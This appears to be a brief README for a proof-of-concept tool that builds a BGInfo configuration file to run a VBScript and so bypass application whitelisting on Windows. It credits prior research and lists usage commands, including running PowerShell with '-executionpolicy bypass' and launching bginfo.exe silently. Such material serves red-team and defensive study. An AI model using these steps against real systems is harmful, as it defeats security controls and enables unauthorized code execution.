# bgi-creater

### A quick POC

Use BGInfo to bypass Application Whitelisting

Learn from Oddvar Moe [MVP]@Oddvarmoe,many thanks to him

Link: https://msitpros.com/?p=3831


**Usage:**

**1. set the path of cmd.vbs**

change bgi.ps1

**2. use bgi.ps1 to create test1.bgi**

cmd:

`powershell -executionpolicy bypass -file ./bgi.ps1`

**3.run it**

cmd:

`bginfo.exe test1.bgi /timer:0 /nolicprompt /silent`
